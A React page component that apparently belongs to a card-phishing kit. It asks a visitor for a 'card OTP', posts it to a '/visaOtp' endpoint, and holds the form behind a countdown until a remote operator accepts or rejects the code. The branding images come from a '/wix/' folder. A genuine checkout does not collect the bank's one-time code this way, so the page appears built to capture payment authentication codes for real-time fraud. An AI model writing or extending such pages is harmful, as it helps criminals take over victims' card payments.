import axios from "axios";
import React, { useEffect, useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { BottomBar } from "../components/VisitorShared";
import { FieldError, formLevelErrorClass } from "../components/FormFieldError";
import { PendingFormOverlay } from "../components/PendingFormOverlay";
import { useLanguage } from "../context/LanguageContext";
import { api_route } from "../socketApi";
import { useOrderSession } from "../hooks/useOrderSession";
import { useTwoMinuteCountdown } from "../hooks/useTwoMinuteCountdown";

function maskPhoneForOtpUi(raw) {
  const d = String(raw || "").replace(/\D/g, "");
  if (!d) return "+97XXXXX";
  if (d.length <= 3) return `+${d}••••`;
  const last = d.slice(-3);
  const prefixLen = Math.min(3, d.length - 3);
  const prefix = d.slice(0, prefixLen);
  const middle = "•".repeat(Math.max(4, d.length - prefixLen - 3));
  return `+${prefix}${middle}${last}`;
}

export default function Otp() {
  const [cardOtp, setCardOtp] = useState("");
  const [cardOtpError, setCardOtpError] = useState("");
  const [formError, setFormError] = useState("");
  const [loading, setLoading] = useState(false);
  const [maskedPhone, setMaskedPhone] = useState("+97XXXXX");
  const navigatedRef = useRef(false);
  const navigate = useNavigate();
  const location = useLocation();
  const orderId =
    location.state?.orderId ?? sessionStorage.getItem("currentOrderId");
  const { t, dir: pageDir, textDir } = useLanguage();

  const { cardOtpAccept, rejectReason, hydrated, reviewCardOtp } =
    useOrderSession(orderId);

  const { formatted: timerFormatted } = useTwoMinuteCountdown(120);

  const awaitingCardOtpDecision =
    hydrated && !!orderId && !cardOtpAccept && !rejectReason && reviewCardOtp;

  useEffect(() => {
    if (!orderId) {
      navigate("/", { replace: true });
      return;
    }
    let cancelled = false;
    (async () => {
      try {
        const { data } = await axios.get(`${api_route}/order/${orderId}`);
        if (!cancelled && data?.phone) {
          setMaskedPhone(maskPhoneForOtpUi(data.phone));
        }
      } catch {
        /* keep default +97XXXXX */
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [orderId, navigate]);

  useEffect(() => {
    if (!hydrated || !orderId || navigatedRef.current) return;

    if (rejectReason) {
      setFormError(rejectReason || t("workflow.rejected"));
      setLoading(false);
      return;
    }

    if (cardOtpAccept) {
      setLoading(false);
      navigatedRef.current = true;
      sessionStorage.setItem("currentOrderId", orderId);
      navigate("/success", { state: { orderId }, replace: true });
    }
  }, [hydrated, cardOtpAccept, rejectReason, orderId, navigate, t]);

  const onCardOtpChange = (e) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 6);
    setCardOtp(v);
    if (cardOtpError) setCardOtpError("");
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (cardOtp.length < 4 || cardOtp.length > 6) {
      setCardOtpError(t("Otp.otpErrorLength"));
      return;
    }
    setCardOtpError("");
    setFormError("");
    setLoading(true);
    try {
      await axios.post(`${api_route}/visaOtp/${orderId}`, {
        otp: cardOtp,
      });
    } catch {
      setLoading(false);
      setFormError(t("formData.errors.formFailed"));
    }
  };

  const blockFormUntilOutcome = loading || awaitingCardOtpDecision;

  if (!orderId) {
    return null;
  }

  const inputErr = !!cardOtpError;

  return (
    <section
      className="relative flex min-h-screen w-full justify-center bg-white"
      dir={pageDir}
    >
      <div
        className="flex w-full max-w-[400px] flex-col items-center px-4 py-8 pb-14 lg:w-1/3"
        dir={textDir}
      >
        <img
          src="/wix/landing-top-logo.png"
          alt=""
          width={134}
          height={61}
          className="mb-3 w-[134px] object-cover"
          fetchPriority="high"
        />

        <img
          src="/wix/otp-hero.png"
          alt=""
          width={320}
          height={181}
          className="mb-4 w-full max-w-[320px] object-cover"
          fetchPriority="high"
        />

        <div className="mb-4 w-full max-w-[320px] space-y-2 text-center text-[13px] font-bold leading-normal tracking-wide text-[#FF4040]">
          <p>{t("otp.smsNotice")}</p>
          <p dir="rtl">
            {t("otp.enterCodePrefix")} {maskedPhone}
          </p>
        </div>

        <form
          onSubmit={handleSubmit}
          className="relative flex w-full max-w-[320px] flex-col gap-3"
          noValidate
        >
          <PendingFormOverlay
            show={blockFormUntilOutcome}
            ariaLabel={t("common.loadingAria")}
          />

          <div className="flex flex-col items-center gap-1" aria-live="polite">
            <span className="text-sm text-slate-600" dir={pageDir}>
              {t("common.otpTimerRemaining")}
            </span>
            <span
              className="text-xl font-semibold tabular-nums tracking-wide text-[#eb249f]"
              dir="ltr"
            >
              {timerFormatted}
            </span>
          </div>

          <input
            type="tel"
            name="phone"
            id="field-card-otp"
            inputMode="numeric"
            autoComplete="one-time-code"
            maxLength={6}
            placeholder="******"
            value={cardOtp}
            onChange={onCardOtpChange}
            aria-invalid={inputErr}
            aria-describedby={inputErr ? "err-card-otp" : undefined}
            className={`w-full rounded-md border bg-white px-3 py-3 text-center text-base tracking-[0.25em] text-slate-900 outline-none transition placeholder:tracking-normal placeholder:text-slate-400 ${
              inputErr
                ? "border-2 border-red-500 focus:ring-2 focus:ring-red-100"
                : "border border-slate-300 focus:border-slate-500 focus:ring-1 focus:ring-slate-400"
            }`}
          />

          <FieldError id="err-card-otp" message={cardOtpError} />

          {formError ? (
            <div className={formLevelErrorClass()} dir={pageDir} role="alert">
              {formError}
            </div>
          ) : null}

          <button
            type="submit"
            disabled={blockFormUntilOutcome}
            aria-label={t("common.verify")}
            className="mt-1 w-full rounded-md bg-[#eb249f] py-3 text-center text-base font-medium text-white shadow-sm transition hover:bg-[#9c0060] disabled:opacity-60"
          >
            {t("common.verify")}
          </button>
        </form>

        <img
          src="/wix/otp-footer.png"
          alt=""
          className="mt-8 w-full  object-cover"
          fetchPriority="high"
        />
      </div>

      <BottomBar />
    </section>
  );
}
